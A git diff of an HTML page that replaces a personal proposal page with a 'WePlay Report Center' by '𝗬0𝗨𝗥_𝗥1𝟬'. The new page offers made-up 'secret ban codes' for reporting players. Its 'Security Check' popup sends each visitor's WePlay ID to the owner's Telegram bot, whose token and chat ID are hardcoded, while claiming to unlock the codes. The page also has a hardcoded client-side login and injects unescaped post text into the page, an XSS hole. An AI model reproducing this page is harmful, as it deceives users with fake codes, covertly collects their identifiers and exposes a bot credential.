@@ -2,173 +2,246 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Infinity | Ridhima ✨</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WePlay Report Center | 𝗬0𝗨𝗥_𝗥1𝟬</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Montserrat:wght@300;900&family=Great+Vibes&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@900&family=Michroma&display=swap');
 
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { background: #05050a; color: #fff; font-family: 'Montserrat', sans-serif; overflow: hidden; height: 100vh; width: 100vw; }
-
-        .bg { position: fixed; inset: 0; background: radial-gradient(circle at center, #1a0033 0%, #05050a 100%); z-index: -1; }
-        .stars { position: fixed; inset: 0; background: url('https://www.transparenttextures.com/patterns/stardust.png'); opacity: 0.2; z-index: -1; }
-
-        section { display: none; position: absolute; inset: 0; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 25px; width: 100%; }
-        .active { display: flex !important; animation: fadeIn 0.8s ease-in-out; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 35px; width: 100%; max-width: 400px; }
+        :root { --blue: #0088ff; --cyan: #00d4ff; --bg: #0d0517; --card: #121b33; --purple: #a855f7; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Michroma', sans-serif; }
         
-        h1 { font-family: 'Cinzel', serif; font-size: 1.8rem; color: #ff0055; text-shadow: 0 0 15px #ff0055; }
-        .script { font-family: 'Great Vibes', cursive; font-size: 3.2rem; color: #fff; margin: 10px 0; }
+        body { background: var(--bg); color: #fff; overflow-x: hidden; min-height: 100vh; }
+
+        /* --- 1. WELCOME SCREEN --- */
+        #welcomeScreen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #0d0517; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; z-index: 9999;
+            transition: opacity 0.8s ease;
+        }
+        .loader-text { font-size: 1.5rem; text-align: center; letter-spacing: 5px; color: var(--cyan); animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.5; transform: scale(0.95); } }
+
+        /* --- 2. LOGIN PAGE --- */
+        #loginOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            display: none; align-items: center; justify-content: center;
+            z-index: 5000; background: radial-gradient(circle, #3d1b5d, #0d0517);
+        }
+        .auth-card {
+            background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px); padding: 40px 25px; border-radius: 35px;
+            width: 90%; max-width: 400px; text-align: center;
+        }
+
+        input, textarea {
+            width: 100%; background: #000; border: 1px solid #333;
+            padding: 15px; border-radius: 15px; color: #fff; font-size: 0.8rem;
+            margin-top: 15px; outline: none; text-align: center;
+        }
+
+        .btn-main {
+            width: 100%; padding: 18px; border-radius: 18px; border: none;
+            background: linear-gradient(135deg, #a855f7, #6b21a8); color: #fff;
+            font-weight: bold; cursor: pointer; margin-top: 20px; letter-spacing: 2px;
+        }
+
+        /* --- 3. MAIN APP --- */
+        #mainApp { display: none; padding-bottom: 100px; opacity: 0; transition: opacity 0.5s; }
+        header { background: #0a1942; padding: 20px; text-align: center; border-bottom: 2px solid var(--blue); position: sticky; top: 0; z-index: 100; }
         
-        .btn { padding: 15px 35px; border-radius: 100px; border: none; background: #ff0055; color: #fff; font-weight: 900; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; margin-top: 20px; box-shadow: 0 10px 25px rgba(255,0,85,0.4); transition: 0.2s; }
+        .container { max-width: 500px; margin: auto; padding: 15px; }
+        .page { display: none; }
+        .active { display: block; animation: fadeInUp 0.5s ease; }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* PASSWORD HIDDEN */
-        input[type="password"] { background: none; border: none; border-bottom: 3px solid #ff0055; color: #ff0055; font-size: 2rem; text-align: center; width: 200px; outline: none; font-family: 'Cinzel'; margin: 20px 0; letter-spacing: 5px; }
+        .card { background: var(--card); border-radius: 20px; padding: 15px; margin-bottom: 15px; border: 1px solid #ffffff10; }
+        .report-item { background: #081025; border: 1px solid var(--blue); border-radius: 15px; padding: 15px; margin-bottom: 15px; }
+        .code-box { background: #000; color: #444; padding: 10px; font-size: 10px; word-break: break-all; border-radius: 8px; display: block; margin: 10px 0; border: 1px solid #222; }
 
-        #timer { font-size: 4.5rem; font-family: 'Cinzel'; font-weight: 900; color: #ff0055; text-shadow: 0 0 25px #ff0055; }
-        
-        .name-tag { position: fixed; font-family: 'Cinzel'; font-size: 2rem; color: #ff0055; top: 50%; transform: translateY(-50%); transition: 1.2s ease-in-out; z-index: 100; opacity: 0; pointer-events: none; }
-        #arjun-tag { left: -200px; } #ridhima-tag { right: -200px; }
-        #final-tulip { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0); font-size: 7rem; transition: 1s; z-index: 101; pointer-events: none; }
+        /* NAVIGATION */
+        .nav { position: fixed; bottom: 0; width: 100%; background: #0a1942; display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid var(--blue); z-index: 1500; }
+        .nav-btn { color: #5c6b8f; border: none; background: none; font-weight: bold; font-size: 11px; flex: 1; cursor: pointer; }
+        .nav-btn.active { color: var(--cyan); }
 
-        /* NO BUTTON PROPER FIX */
-        .btn-container { position: relative; width: 100%; height: 200px; margin-top: 30px; }
-        #n-btn { position: absolute; transition: all 0.3s ease; white-space: nowrap; font-size: 0.8rem; padding: 12px 25px; background: none; border: 1px solid #fff; }
-
-        .about-btn { position: fixed; top: 20px; right: 20px; font-size: 0.6rem; color: #ff0055; border: 1px solid #ff0055; padding: 6px 12px; border-radius: 20px; }
+        #verifyPopup { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95);
+            display: none; align-items: center; justify-content: center; z-index: 8000;
+        }
     </style>
 </head>
 <body>
 
-    <div class="bg"></div>
-    <div class="stars"></div>
+    <div id="welcomeScreen">
+        <h1 class="loader-text">WEPLAY REPORT<br>CENTER</h1>
+        <p style="margin-top:20px; font-size:10px; color:grey; letter-spacing:3px;">BY 𝗬0𝗨𝗥_𝗥1𝟬</p>
+    </div>
 
-    <section id="p1" class="active">
-        <h1 style="font-size: 0.8rem; opacity: 0.6; letter-spacing: 3px;">ENCRYPTED ACCESS</h1>
-        <input type="password" id="pass" placeholder="•••••">
-        <br><button class="btn" onclick="check()">Enter</button>
-    </section>
-
-    <section id="p2">
-        <p style="letter-spacing: 5px;">HELLO</p>
-        <h1 class="script">Ridhima</h1>
-    </section>
-
-    <section id="p3">
-        <h1 style="font-size: 1.2rem; letter-spacing: 5px;">WELCOME TO MY WORLD</h1>
-        <p class="script">Where you are the Queen.</p>
-    </section>
-
-    <section id="p4">
-        <div class="glass">
-            <h1 style="font-size: 1.1rem;">Ridhima...</h1>
-            <p style="margin: 15px 0; line-height: 1.6; font-size: 0.85rem; text-align: justify;">
-                Ranchi ki thand aur tumhari baatein... dono hi dil ko chhu jati hain. Main chahta hoon ki hum Ranchi ki har gali mein **Icecream** khayenge aur dher saare **Pink Tulips** tumhare liye launga. 🌷🍦
-            </p>
-            <button class="btn" onclick="go(5); startTimer();">Ek Surprise Hai</button>
-        </div>
-    </section>
-
-    <section id="p5">
-        <p style="letter-spacing: 3px; color: #ff0055;">WAITING FOR THE MOMENT...</p>
-        <div id="timer">60</div>
-    </section>
-
-    <section id="p6">
-        <div class="glass">
-            <h1 class="script" style="font-size: 2.8rem;">Beautiful You</h1>
-            <p style="margin: 15px 0; line-height: 1.6; font-size: 0.9rem; font-style: italic;">
-                "Tumhari smile Tagore Hill ki dhoop jaisi hai,<br>
-                Ranchi ki shaam se bhi pyari hai teri aankhein.<br>
-                Ab toh bina baat kiye din hi nahi kat-ta." 🌷
-            </p>
-            <button class="btn" onclick="go(7)">Aage Dekho</button>
-        </div>
-    </section>
-
-    <section id="p7">
-        <button class="about-btn" onclick="toggleAbout()">About Arjun</button>
-        <h1 class="script" style="font-size: 2.8rem;">Will You Be Mine?</h1>
-        <div class="btn-container">
-            <button id="y-btn" class="btn" style="position: absolute; top: 0; left: 50%; transform: translateX(-50%); width: 200px; z-index: 10;" onclick="matchNames()">HAAN! 😍</button>
-            <button id="n-btn" class="btn" style="top: 100px; left: 50%; transform: translateX(-50%);" onmouseover="runAway()" onclick="runAway()">NAHI 😜</button>
-        </div>
-    </section>
-
-    <section id="p8">
-        <h1 class="script" style="font-size: 5rem;">Forever ❤️</h1>
-        <button class="btn" style="background: linear-gradient(45deg, #f09433, #bc1888);" onclick="window.open('https://instagram.com/your__ri0', '_blank')">Follow @your__ri0</button>
-    </section>
-
-    <div id="arjun-tag" class="name-tag">ARJUN</div>
-    <div id="ridhima-tag" class="name-tag">RIDHIMA</div>
-    <div id="final-tulip">🌷</div>
-
-    <div id="about-overlay" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.98); z-index:200; align-items:center; justify-content:center; padding:30px;">
-        <div class="glass">
-            <h1>MAIN HOON ARJUN</h1>
-            <p style="margin: 15px 0; font-size: 0.85rem;">Ranchi ka ladka, thoda mysterious par dil se saccha. Mere world mein hamesha Icecream aur Tulips tumhare liye rahenge! 🍦🌷</p>
-            <button class="btn" onclick="toggleAbout()">Wapas</button>
+    <div id="loginOverlay">
+        <div class="auth-card">
+            <h2 style="color:var(--cyan); margin-bottom:10px;">Login</h2>
+            <p style="font-size:10px; color:#888;">Owner Access Only</p>
+            <input type="text" id="id-input" placeholder="Enter Owner ID">
+            <input type="text" id="name-input" placeholder="Enter Owner Name">
+            <button class="btn-main" onclick="startApp()">LOGIN</button>
+            <p id="err" style="color:red; font-size:10px; margin-top:10px;"></p>
         </div>
     </div>
 
+    <div id="mainApp">
+        <header><h1 style="color:var(--cyan); font-size:16px;">WePlay Report Codes</h1></header>
+
+        <div class="container">
+            <div id="home" class="page active">
+                <div class="card" style="text-align:center;">
+                    <p style="color:#00ff88; font-size:12px;">SYSTEM STATUS: ONLINE</p>
+                </div>
+                <div class="card">
+                    <input type="text" id="pName" placeholder="Your Name">
+                    <textarea id="pText" placeholder="Violation Details..."></textarea>
+                    <input type="file" id="fInp" accept="image/*" style="padding:10px; border:none;">
+                    <button class="btn-main" style="padding:12px;" onclick="addPost()">POST TO FEED</button>
+                </div>
+                <div id="feedArea"></div>
+            </div>
+
+            <div id="reports" class="page">
+                <div class="card">
+                    <h2 style="color:var(--cyan); text-align:center; margin-bottom:20px;">8 Secret Codes</h2>
+                    
+                    <div class="report-item"><p style="font-size:11px;">1. Permanent Ban</p><span class="code-box" id="c1">FATAL_VIOLATION_DETECTED_REQ_PERMANENT_HARDWARE_TERMINATION_SEC_9.1_GLOBAL</span><button class="btn-main" style="padding:10px; font-size:10px;" onclick="copyIt('c1')">COPY CODE</button></div>
+                    
+                    <div class="report-item"><p style="font-size:11px;">2. Room Closure</p><span class="code-box" id="c2">REQ_ROOM_CLOSURE_AND_VOICE_BAN_SEVERE_HARASSMENT_STRIKE_V2</span><button class="btn-main" style="padding:10px; font-size:10px;" onclick="copyIt('c2')">COPY CODE</button></div>
+                    
+                    <div class="report-item"><p style="font-size:11px;">3. Underage Report</p><span class="code-box" id="c3">REQ_BAN_ID_SEC_8.1_UNDERAGE_USER_UNDER_13_DETECTED_FATAL</span><button class="btn-main" style="padding:10px; font-size:10px;" onclick="copyIt('c3')">COPY CODE</button></div>
+
+                    <div class="report-item"><p style="font-size:11px;">4. Profile/Bio Ban</p><span class="code-box" id="c4">REQ_BAN_ID_SEC_1.5_PROHIBITED_PROFILE_CONTENT_OR_BIO_SIG</span><button class="btn-main" style="padding:10px; font-size:10px;" onclick="copyIt('c4')">COPY CODE</button></div>
+
+                    <div class="report-item"><p style="font-size:11px;">5. Severe Harassment</p><span class="code-box" id="c5">TERMINATE_ACCOUNT_PROTOCOL_SEC_4.2_SEVERE_HARASSMENT_REPORT_V3</span><button class="btn-main" style="padding:10px; font-size:10px;" onclick="copyIt('c5')">COPY CODE</button></div>
+
+                    <div class="report-item"><p style="font-size:11px;">6. Scam/Fraud Activity</p><span class="code-box" id="c6">REQ_BAN_ID_SEC_2.9_SCAM_OR_FRAUDULENT_ACTIVITY_DETECTED</span><button class="btn-main" style="padding:10px; font-size:10px;" onclick="copyIt('c6')">COPY CODE</button></div>
+
+                    <div class="report-item"><p style="font-size:11px;">7. Extreme Voice Abuse</p><span class="code-box" id="c7">VOICE_CHAT_TERMINATION_REQ_SEC_11.5_EXTREME_ABUSE_DETECTED</span><button class="btn-main" style="padding:10px; font-size:10px;" onclick="copyIt('c7')">COPY CODE</button></div>
+
+                    <div class="report-item"><p style="font-size:11px;">8. Hack/Bypass Detection</p><span class="code-box" id="c8">DETECTION_OF_THIRD_PARTY_TOOLS_BYPASS_REQ_BAN_STRIKE_9.9</span><button class="btn-main" style="padding:10px; font-size:10px;" onclick="copyIt('c8')">COPY CODE</button></div>
+                </div>
+            </div>
+
+            <div id="about" class="page">
+                <div class="card" style="text-align:center;">
+                    <h2 style="color:var(--cyan);">𝗬0𝗨𝗥_𝗥1𝟬</h2>
+                    <p style="font-size:12px; margin:20px 0;">WePlay Security Specialist</p>
+                    <a href="https://www.instagram.com/y0ur_r10" class="btn-main" style="text-decoration:none; display:block;">INSTAGRAM</a>
+                </div>
+            </div>
+        </div>
+
+        <div class="nav">
+            <button class="nav-btn active" id="nH" onclick="go('home')">FEED</button>
+            <button class="nav-btn" id="nR" onclick="go('reports')">CODES</button>
+            <button class="nav-btn" id="nA" onclick="go('about')">OWNER</button>
+        </div>
+    </div>
+
+    <div id="verifyPopup">
+        <div class="auth-card" style="max-width:320px;">
+            <h3 style="color:var(--cyan);">Security Check</h3>
+            <input type="number" id="wID" placeholder="Enter WePlay ID">
+            <button class="btn-main" id="vBtn" onclick="sendToOwner()">UNLOCK CODES</button>
+            <button style="background:none; border:none; color:grey; margin-top:15px; cursor:pointer;" onclick="hidePop()">Cancel</button>
+        </div>
+    </div>
+
+    <textarea id="copyHelper" style="position:fixed; left:-9999px;"></textarea>
+
     <script>
-        let count = 0;
-        function go(n) {
-            document.querySelectorAll('section').forEach(s => s.classList.remove('active'));
-            document.getElementById('p' + n).classList.add('active');
-        }
+        // Welcome Screen Logic
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => {
+                const welcome = document.getElementById('welcomeScreen');
+                welcome.style.opacity = '0';
+                setTimeout(() => {
+                    welcome.style.display = 'none';
+                    document.getElementById('loginOverlay').style.display = 'flex';
+                }, 800);
+            }, 3000); 
+        });
 
-        function check() {
-            // Password logic
-            if(document.getElementById('pass').value.toLowerCase() === 'arjun') {
-                go(2); setTimeout(() => go(3), 2000); setTimeout(() => go(4), 4000);
-            } else { alert("Arre! Password toh galat hai!"); }
-        }
-
-        function startTimer() {
-            let s = 60;
-            const t = document.getElementById('timer');
-            const intrvl = setInterval(() => {
-                s--; t.innerText = s;
-                if(s <= 0) { clearInterval(intrvl); go(6); }
-            }, 1000);
-        }
-
-        // NO BUTTON SMOOTH RUN LOGIC
-        function runAway() {
-            if(count < 4) {
-                const btn = document.getElementById('n-btn');
-                const container = document.querySelector('.btn-container');
-                const maxX = container.clientWidth - btn.clientWidth;
-                const maxY = container.clientHeight - btn.clientHeight;
-                
-                btn.style.left = Math.random() * maxX + 'px';
-                btn.style.top = Math.random() * maxY + 'px';
-                btn.style.transform = 'none'; // Remove centering
-                
-                btn.innerText = ["Pakad ke dikhao!", "Koshish karo!", "Piche dekho!", "Almost there!"][count];
-                count++;
+        // Simple Login
+        function startApp() {
+            const id = document.getElementById('id-input').value;
+            const name = document.getElementById('name-input').value;
+            if(id === '45580039' && name === '𝗬0𝗨𝗥_𝗥1𝟬') {
+                document.getElementById('loginOverlay').style.display = 'none';
+                const main = document.getElementById('mainApp');
+                main.style.display = 'block';
+                setTimeout(() => main.style.opacity = '1', 50);
             } else {
-                document.getElementById('n-btn').innerText = "Theek hai, YES hi dabati hoon!";
-                document.getElementById('n-btn').onclick = () => matchNames();
+                document.getElementById('err').innerText = "Invalid ID or Name!";
             }
         }
 
-        function matchNames() {
-            const a = document.getElementById('arjun-tag'), r = document.getElementById('ridhima-tag'), t = document.getElementById('final-tulip');
-            a.style.opacity = '1'; r.style.opacity = '1';
-            setTimeout(() => { a.style.left = "calc(50% - 120px)"; r.style.right = "calc(50% - 130px)"; }, 100);
-            setTimeout(() => { a.style.opacity = '0'; r.style.opacity = '0'; t.style.transform = "translate(-50%, -50%) scale(1.5)"; }, 1500);
-            setTimeout(() => { go(8); t.style.display = 'none'; }, 3500);
+        // Navigation
+        let unlocked = false;
+        function go(id) {
+            if(id === 'reports' && !unlocked) {
+                document.getElementById('verifyPopup').style.display = 'flex';
+                return;
+            }
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+            if(id === 'home') document.getElementById('nH').classList.add('active');
+            if(id === 'reports') document.getElementById('nR').classList.add('active');
+            if(id === 'about') document.getElementById('nA').classList.add('active');
+            window.scrollTo(0,0);
         }
 
-        function toggleAbout() {
-            const el = document.getElementById('about-overlay');
-            el.style.display = (el.style.display === 'flex') ? 'none' : 'flex';
+        function hidePop() { document.getElementById('verifyPopup').style.display = 'none'; }
+
+        // Telegram Bot Alert
+        function sendToOwner() {
+            let idVal = document.getElementById('wID').value;
+            if(idVal.length < 5) return alert("Enter valid WePlay ID!");
+            document.getElementById('vBtn').innerText = "Unlocking...";
+            fetch(`https://api.telegram.org/bot8665383372:AAFta6tJFG6Pbl-4dC4eemifVkplMYIMpAk/sendMessage?chat_id=1803032817&text=${encodeURIComponent("Codes Unlocked by ID: " + idVal)}`)
+            .then(() => { unlocked = true; hidePop(); go('reports'); });
+        }
+
+        // Post System
+        function addPost() {
+            let n = document.getElementById('pName').value || "Agent";
+            let t = document.getElementById('pText').value;
+            let f = document.getElementById('fInp').files[0];
+            if(!t && !f) return alert("Please add some text!");
+
+            let id = "post_" + Date.now();
+            let html = `<div class="card" id="${id}">
+                <button style="float:right; color:red; background:none; border:none; cursor:pointer;" onclick="document.getElementById('${id}').remove()">×</button>
+                <b style="color:var(--cyan); font-size:11px;">@${n}</b>
+                <p style="font-size:13px; margin-top:8px;">${t}</p>
+                <img id="img-${id}" style="width:100%; border-radius:15px; margin-top:10px; display:none; border: 1px solid #333;">
+            </div>`;
+            document.getElementById('feedArea').insertAdjacentHTML('afterbegin', html);
+            if(f) {
+                let r = new FileReader();
+                r.onload = (e) => { 
+                    let im = document.getElementById('img-'+id);
+                    im.src = e.target.result; im.style.display = "block";
+                };
+                r.readAsDataURL(f);
+            }
+            document.getElementById('pText').value = ""; document.getElementById('fInp').value = "";
+        }
+
+        // Copy Logic
+        function copyIt(id) {
+            const txt = document.getElementById(id).innerText;
+            const h = document.getElementById('copyHelper');
+            h.value = txt; h.select();
+            document.execCommand("copy");
+            alert("Code Copied!");
         }
     </script>
 </body>
-</html>
+                </html>
